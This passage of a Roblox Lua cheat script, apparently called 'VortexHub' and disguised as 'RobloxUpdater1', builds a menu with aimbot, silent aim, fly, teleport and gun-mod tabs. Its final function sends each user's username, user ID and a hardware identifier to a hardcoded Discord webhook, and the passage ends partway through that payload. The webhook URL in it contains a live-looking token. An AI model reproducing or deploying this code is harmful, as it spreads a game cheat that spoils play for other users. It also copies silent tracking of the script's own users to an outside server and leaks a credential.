UI["286"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.FlyKey.TextBox.Function \\ --
UI["287"] = Instance.new("LocalScript", UI["286"])
UI["287"]["Name"] = [[Function]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons \\ --
UI["288"] = Instance.new("Folder", UI["4"])
UI["288"]["Name"] = [[Buttons]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.XUI \\ --
UI["289"] = Instance.new("ImageButton", UI["288"])
UI["289"]["BorderSizePixel"] = 0
UI["289"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["289"]["ZIndex"] = 10
UI["289"]["Image"] = [[rbxassetid://88802135936026]]
UI["289"]["Size"] = UDim2.new(0, 34, 0, 35)
UI["289"]["BackgroundTransparency"] = 1
UI["289"]["Name"] = [[XUI]]
UI["289"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["289"]["Position"] = UDim2.new(0.91826, 5, 0.01543, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.XUI.UICorner \\ --
UI["28a"] = Instance.new("UICorner", UI["289"])
UI["28a"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.STARTUP \\ --
UI["28b"] = Instance.new("ImageButton", UI["288"])
UI["28b"]["BorderSizePixel"] = 0
UI["28b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["28b"]["ZIndex"] = 4
UI["28b"]["Image"] = [[rbxassetid://76350238152141]]
UI["28b"]["Size"] = UDim2.new(0, 35, 0, 35)
UI["28b"]["BackgroundTransparency"] = 1
UI["28b"]["Name"] = [[STARTUP]]
UI["28b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["28b"]["Position"] = UDim2.new(0.08014, 0, 0.01864, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.STARTUP.UICorner \\ --
UI["28c"] = Instance.new("UICorner", UI["28b"])
UI["28c"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame \\ --
UI["28d"] = Instance.new("ScrollingFrame", UI["288"])
UI["28d"]["Active"] = true
UI["28d"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["28d"]["BorderSizePixel"] = 0
UI["28d"]["CanvasSize"] = UDim2.new(0, 0, 0.9, 0)
UI["28d"]["AutoLocalize"] = false
UI["28d"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["28d"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["28d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["28d"]["VerticalScrollBarPosition"] = Enum.VerticalScrollBarPosition.Left
UI["28d"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["28d"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y
UI["28d"]["Size"] = UDim2.new(0, 126, 0, 254)
UI["28d"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["28d"]["Position"] = UDim2.new(0, 0, 0.17569, 0)
UI["28d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["28d"]["ScrollBarThickness"] = 3
UI["28d"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Aimbot \\ --
UI["28e"] = Instance.new("TextButton", UI["28d"])
UI["28e"]["BorderSizePixel"] = 0
UI["28e"]["TextSize"] = 14
UI["28e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["28e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["28e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["28e"]["ZIndex"] = 2
UI["28e"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["28e"]["BackgroundTransparency"] = 0.85
UI["28e"]["Name"] = [[Aimbot]]
UI["28e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["28e"]["Text"] = [[AIMBOT]]
UI["28e"]["Position"] = UDim2.new(0.06264, 0, 0.34596, 1)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Aimbot.UICorner \\ --
UI["28f"] = Instance.new("UICorner", UI["28e"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Aimbot.UIGradient \\ --
UI["290"] = Instance.new("UIGradient", UI["28e"])
UI["290"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Aimbot.Click Sound1 \\ --
UI["291"] = Instance.new("LocalScript", UI["28e"])
UI["291"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.MAIN \\ --
UI["292"] = Instance.new("TextButton", UI["28d"])
UI["292"]["BorderSizePixel"] = 0
UI["292"]["TextSize"] = 14
UI["292"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["292"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["292"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["292"]["ZIndex"] = 2
UI["292"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["292"]["BackgroundTransparency"] = 0.85
UI["292"]["Name"] = [[MAIN]]
UI["292"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["292"]["Text"] = [[SAFETY]]
UI["292"]["Position"] = UDim2.new(0.06264, 0, 0.0461, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.MAIN.UICorner \\ --
UI["293"] = Instance.new("UICorner", UI["292"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.MAIN.UIGradient \\ --
UI["294"] = Instance.new("UIGradient", UI["292"])
UI["294"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.MAIN.Click Sound1 \\ --
UI["295"] = Instance.new("LocalScript", UI["292"])
UI["295"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Misc \\ --
UI["296"] = Instance.new("TextButton", UI["28d"])
UI["296"]["BorderSizePixel"] = 0
UI["296"]["TextSize"] = 14
UI["296"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["296"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["296"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["296"]["ZIndex"] = 2
UI["296"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["296"]["BackgroundTransparency"] = 0.85
UI["296"]["Name"] = [[Misc]]
UI["296"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["296"]["Text"] = [[MISC]]
UI["296"]["Position"] = UDim2.new(0.06264, 0, 0.81153, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Misc.UICorner \\ --
UI["297"] = Instance.new("UICorner", UI["296"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Misc.UIGradient \\ --
UI["298"] = Instance.new("UIGradient", UI["296"])
UI["298"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Misc.Click Sound1 \\ --
UI["299"] = Instance.new("LocalScript", UI["296"])
UI["299"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Teleport \\ --
UI["29a"] = Instance.new("TextButton", UI["28d"])
UI["29a"]["BorderSizePixel"] = 0
UI["29a"]["TextSize"] = 14
UI["29a"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["29a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["29a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["29a"]["ZIndex"] = 2
UI["29a"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["29a"]["BackgroundTransparency"] = 0.85
UI["29a"]["Name"] = [[Teleport]]
UI["29a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["29a"]["Text"] = [[TELEPORT]]
UI["29a"]["Position"] = UDim2.new(0.06264, 0, 0.50417, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Teleport.UICorner \\ --
UI["29b"] = Instance.new("UICorner", UI["29a"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Teleport.UIGradient \\ --
UI["29c"] = Instance.new("UIGradient", UI["29a"])
UI["29c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Teleport.Click Sound1 \\ --
UI["29d"] = Instance.new("LocalScript", UI["29a"])
UI["29d"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.VISUALS \\ --
UI["29e"] = Instance.new("TextButton", UI["28d"])
UI["29e"]["BorderSizePixel"] = 0
UI["29e"]["TextSize"] = 14
UI["29e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["29e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["29e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["29e"]["ZIndex"] = 2
UI["29e"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["29e"]["BackgroundTransparency"] = 0.85
UI["29e"]["Name"] = [[VISUALS]]
UI["29e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["29e"]["Text"] = [[VISUALS]]
UI["29e"]["Position"] = UDim2.new(0.06264, 0, 0.19606, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.VISUALS.UICorner \\ --
UI["29f"] = Instance.new("UICorner", UI["29e"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.VISUALS.UIGradient \\ --
UI["2a0"] = Instance.new("UIGradient", UI["29e"])
UI["2a0"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.VISUALS.Click Sound1 \\ --
UI["2a1"] = Instance.new("LocalScript", UI["29e"])
UI["2a1"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Vehicle \\ --
UI["2a2"] = Instance.new("TextButton", UI["28d"])
UI["2a2"]["BorderSizePixel"] = 0
UI["2a2"]["TextSize"] = 14
UI["2a2"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["2a2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["2a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["2a2"]["ZIndex"] = 2
UI["2a2"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["2a2"]["BackgroundTransparency"] = 0.85
UI["2a2"]["Name"] = [[Vehicle]]
UI["2a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2a2"]["Text"] = [[VEHICLE]]
UI["2a2"]["Position"] = UDim2.new(0.06264, 0, 0.65614, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Vehicle.UICorner \\ --
UI["2a3"] = Instance.new("UICorner", UI["2a2"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Vehicle.UIGradient \\ --
UI["2a4"] = Instance.new("UIGradient", UI["2a2"])
UI["2a4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Vehicle.Click Sound1 \\ --
UI["2a5"] = Instance.new("LocalScript", UI["2a2"])
UI["2a5"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.GunMods \\ --
UI["2a6"] = Instance.new("TextButton", UI["28d"])
UI["2a6"]["BorderSizePixel"] = 0
UI["2a6"]["TextSize"] = 14
UI["2a6"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["2a6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["2a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["2a6"]["ZIndex"] = 2
UI["2a6"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["2a6"]["BackgroundTransparency"] = 0.85
UI["2a6"]["Name"] = [[GunMods]]
UI["2a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2a6"]["Text"] = [[GUNMODS]]
UI["2a6"]["Position"] = UDim2.new(0.06264, 0, 0.96329, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.GunMods.UICorner \\ --
UI["2a7"] = Instance.new("UICorner", UI["2a6"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.GunMods.UIGradient \\ --
UI["2a8"] = Instance.new("UIGradient", UI["2a6"])
UI["2a8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.GunMods.Click Sound1 \\ --
UI["2a9"] = Instance.new("LocalScript", UI["2a6"])
UI["2a9"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Server \\ --
UI["2aa"] = Instance.new("TextButton", UI["28d"])
UI["2aa"]["BorderSizePixel"] = 0
UI["2aa"]["TextSize"] = 14
UI["2aa"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["2aa"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["2aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["2aa"]["ZIndex"] = 2
UI["2aa"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["2aa"]["BackgroundTransparency"] = 0.85
UI["2aa"]["Name"] = [[Server]]
UI["2aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2aa"]["Text"] = [[SERVER]]
UI["2aa"]["Position"] = UDim2.new(0.06546, 0, 1.12096, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Server.UICorner \\ --
UI["2ab"] = Instance.new("UICorner", UI["2aa"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Server.UIGradient \\ --
UI["2ac"] = Instance.new("UIGradient", UI["2aa"])
UI["2ac"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Server.Click Sound1 \\ --
UI["2ad"] = Instance.new("LocalScript", UI["2aa"])
UI["2ad"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.UIListLayout \\ --
UI["2ae"] = Instance.new("UIListLayout", UI["28d"])
UI["2ae"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["2ae"]["Padding"] = UDim.new(0, 7)
UI["2ae"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.UIPadding \\ --
UI["2af"] = Instance.new("UIPadding", UI["28d"])
UI["2af"]["PaddingTop"] = UDim.new(0, 7)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Stats \\ --
UI["2b0"] = Instance.new("TextButton", UI["28d"])
UI["2b0"]["BorderSizePixel"] = 0
UI["2b0"]["TextSize"] = 14
UI["2b0"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["2b0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["2b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["2b0"]["ZIndex"] = 2
UI["2b0"]["Size"] = UDim2.new(0, 112, 0, 35)
UI["2b0"]["BackgroundTransparency"] = 0.85
UI["2b0"]["Name"] = [[Stats]]
UI["2b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2b0"]["Text"] = [[STATS]]
UI["2b0"]["Position"] = UDim2.new(0.06895, 0, 1.08237, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Stats.UICorner \\ --
UI["2b1"] = Instance.new("UICorner", UI["2b0"])


-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Stats.UIGradient \\ --
UI["2b2"] = Instance.new("UIGradient", UI["2b0"])
UI["2b2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Stats.Click Sound1 \\ --
UI["2b3"] = Instance.new("LocalScript", UI["2b0"])
UI["2b3"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.Socials \\ --
UI["2b4"] = Instance.new("ImageButton", UI["288"])
UI["2b4"]["BorderSizePixel"] = 0
UI["2b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["2b4"]["ZIndex"] = 5
UI["2b4"]["Image"] = [[rbxassetid://72435266542170]]
UI["2b4"]["Size"] = UDim2.new(0, 35, 0, 35)
UI["2b4"]["BackgroundTransparency"] = 1
UI["2b4"]["Name"] = [[Socials]]
UI["2b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2b4"]["Position"] = UDim2.new(0.00871, 0, 0.0185, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.Socials.UICorner \\ --
UI["2b5"] = Instance.new("UICorner", UI["2b4"])
UI["2b5"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.Settings \\ --
UI["2b6"] = Instance.new("ImageButton", UI["288"])
UI["2b6"]["BorderSizePixel"] = 0
UI["2b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["2b6"]["ZIndex"] = 10
UI["2b6"]["Image"] = [[rbxassetid://136372388959380]]
UI["2b6"]["Size"] = UDim2.new(0, 34, 0, 35)
UI["2b6"]["BackgroundTransparency"] = 1
UI["2b6"]["Name"] = [[Settings]]
UI["2b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2b6"]["Position"] = UDim2.new(0.14125, 5, 0.01864, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Buttons.Settings.UICorner \\ --
UI["2b7"] = Instance.new("UICorner", UI["2b6"])
UI["2b7"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.plrname \\ --
UI["2b8"] = Instance.new("TextLabel", UI["4"])
UI["2b8"]["TextWrapped"] = true
UI["2b8"]["BorderSizePixel"] = 0
UI["2b8"]["TextTransparency"] = 0.37
UI["2b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["2b8"]["TextSize"] = 17
UI["2b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["2b8"]["TextColor3"] = Color3.fromRGB(0, 0, 0)
UI["2b8"]["BackgroundTransparency"] = 1
UI["2b8"]["Size"] = UDim2.new(0, 129, 0, 35)
UI["2b8"]["Visible"] = false
UI["2b8"]["BorderColor3"] = Color3.fromRGB(255, 255, 255)
UI["2b8"]["Text"] = [[Loading...]]
UI["2b8"]["Name"] = [[plrname]]
UI["2b8"]["Position"] = UDim2.new(0.38676, 0, 0.01977, 0)

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame \\ --
UI["2b9"] = Instance.new("Frame", UI["4"])
UI["2b9"]["BorderSizePixel"] = 0
UI["2b9"]["SelectionOrder"] = 6
UI["2b9"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34)
UI["2b9"]["Size"] = UDim2.new(0, 574, 0, 55)
UI["2b9"]["Position"] = UDim2.new(0, 0, -0.00116, 0)
UI["2b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2b9"]["Name"] = [[TabsFrame]]

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.UICorner \\ --
UI["2ba"] = Instance.new("UICorner", UI["2b9"])


-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Name \\ --
UI["2bb"] = Instance.new("TextLabel", UI["2b9"])
UI["2bb"]["TextWrapped"] = true
UI["2bb"]["Interactable"] = false
UI["2bb"]["ZIndex"] = 9
UI["2bb"]["BorderSizePixel"] = 0
UI["2bb"]["AutoLocalize"] = false
UI["2bb"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255)
UI["2bb"]["SelectionOrder"] = 4
UI["2bb"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["2bb"]["TextSize"] = 18
UI["2bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["2bb"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["2bb"]["RichText"] = true
UI["2bb"]["Size"] = UDim2.new(0, 152, 0, 35)
UI["2bb"]["BorderColor3"] = Color3.fromRGB(255, 255, 255)
UI["2bb"]["Text"] = [[VortexHubÂ®]]
UI["2bb"]["Name"] = [[Name]]
UI["2bb"]["Position"] = UDim2.new(0.38723, 0, 0.09697, 0)

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Name.UIGradient \\ --
UI["2bc"] = Instance.new("UIGradient", UI["2bb"])
UI["2bc"]["Rotation"] = -180
UI["2bc"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(136, 136, 136))}

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Name.UICorner \\ --
UI["2bd"] = Instance.new("UICorner", UI["2bb"])
UI["2bd"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Name.LocalScript \\ --
UI["2be"] = Instance.new("LocalScript", UI["2bb"])


-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Tabs Imgae \\ --
UI["2bf"] = Instance.new("ImageLabel", UI["2b9"])
UI["2bf"]["BorderSizePixel"] = 0
UI["2bf"]["SelectionOrder"] = 4
UI["2bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["2bf"]["Image"] = [[rbxassetid://135834069695816]]
UI["2bf"]["Size"] = UDim2.new(0, 574, 0, 54)
UI["2bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2bf"]["BackgroundTransparency"] = 1
UI["2bf"]["Name"] = [[Tabs Imgae]]
UI["2bf"]["Position"] = UDim2.new(0, 0, 0, 0)

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Tabs Imgae.UICorner \\ --
UI["2c0"] = Instance.new("UICorner", UI["2bf"])


-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Tabs Imgae.UIGradient \\ --
UI["2c1"] = Instance.new("UIGradient", UI["2bf"])
UI["2c1"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(217, 217, 217)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(199, 199, 199))}

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Tabs Imgae.ImageLabel \\ --
UI["2c2"] = Instance.new("ImageLabel", UI["2bf"])
UI["2c2"]["BorderSizePixel"] = 0
UI["2c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["2c2"]["Image"] = [[rbxassetid://86086191069014]]
UI["2c2"]["Size"] = UDim2.new(0, 574, 0, 7)
UI["2c2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2c2"]["Position"] = UDim2.new(0, 0, 0.88194, 0)

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI \\ --
UI["2c3"] = Instance.new("ImageButton", UI["2b9"])
UI["2c3"]["BorderSizePixel"] = 0
UI["2c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["2c3"]["Image"] = [[rbxassetid://82227394551742]]
UI["2c3"]["Size"] = UDim2.new(0, 35, 0, 35)
UI["2c3"]["BackgroundTransparency"] = 1
UI["2c3"]["Name"] = [[CUI]]
UI["2c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2c3"]["Position"] = UDim2.new(0.84683, 5, 0.09382, 0)

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.UICorner \\ --
UI["2c4"] = Instance.new("UICorner", UI["2c3"])
UI["2c4"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.CloseScript \\ --
UI["2c5"] = Instance.new("LocalScript", UI["2c3"])
UI["2c5"]["Name"] = [[CloseScript]]

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.animation \\ --
UI["2c6"] = Instance.new("LocalScript", UI["2c3"])
UI["2c6"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.Click Sound1 \\ --
UI["2c7"] = Instance.new("LocalScript", UI["2c3"])
UI["2c7"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.Click Sound1 \\ --
UI["2c8"] = Instance.new("LocalScript", UI["2c3"])
UI["2c8"]["Name"] = [[Click Sound1]]

-- // StarterGui.RobloxUpdater1.MainTab.Site Line \\ --
UI["2c9"] = Instance.new("Frame", UI["4"])
UI["2c9"]["BorderSizePixel"] = 0
UI["2c9"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["2c9"]["Size"] = UDim2.new(0, 3, 0, 256)
UI["2c9"]["Position"] = UDim2.new(0.22, 0, 0.17569, 0)
UI["2c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["2c9"]["Name"] = [[Site Line]]

-- // StarterGui.RobloxUpdater1.MainTab.Settings \\ --
UI["2ca"] = Instance.new("Configuration", UI["4"])
UI["2ca"]["Name"] = [[Settings]]
-- Attributes
UI["2ca"]:SetAttribute([[FlyKey]], [[V]])
UI["2ca"]:SetAttribute([[SilentAimKey]], [[K]])
UI["2ca"]:SetAttribute([[CarFlyKey]], [[X]])
UI["2ca"]:SetAttribute([[AimBotKey]], [[L]])

-- // StarterGui.RobloxUpdater1.B-W24 \\ --
local function SCRIPT_2()
local script = UI["2"]
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	-- Konfiguration
	local webhookURL = "https://discord.com/api/webhooks/1356679654995525906/s_EtAnzDtyKR8f8EuMhMkvzFou71no8RTWx3cF_GZPH28lFMTUhhtK7D-HAn9bTwaOcl"
	local blacklistEditLink = ""
	local userProfileBaseURL = "https://www.roblox.com/users/"
	
	-- NutzungszÃ¤hler
	_G.ScriptOpens = _G.ScriptOpens or 0
	_G.ScriptOpens = _G.ScriptOpens + 1
	
	-- API-Abfrage
	local loadUpResponse = game:HttpGet(""..game:GetService("RbxAnalyticsService"):GetClientId(), true)
	local loadRightUpResponse = HttpService:JSONDecode(loadUpResponse)
	
	-- Discord Webhook Funktion
	local function sendToDiscord(username, userId, hwid, status, reason, scriptUses, expiry)
		local userProfileLink = userProfileBaseURL .. userId .. "/profile"
	
		local data = {
			username = "VortexHubÂ®",
			embeds = {
				{
					title = "Script geÃ¶ffnet!",
					description = "Ein Spieler hat das Script geÃ¶ffnet!",
					fields = {
						{ 
							name = "ðŸ‘¤ Benutzername", 
							value = string.format("[%s](%s)", username, userProfileLink), 
							inline = true 
						},
						{ 
							name = "ðŸ†” UserID", 
							value = string.format("[%s](%s)", tostring(userId), userProfileLink), 
							inline = true 
						},
						{ name = "ðŸ–¥ï¸ HWID", value = hwid, inline = true },
						{ name = "ðŸ“œ Status", value = status, inline = true },
						{ name = "ðŸš¨ Grund", value = reason or "Nicht gebannt", inline = true },
						{ 
							name = "ðŸŽ® Spiel", 
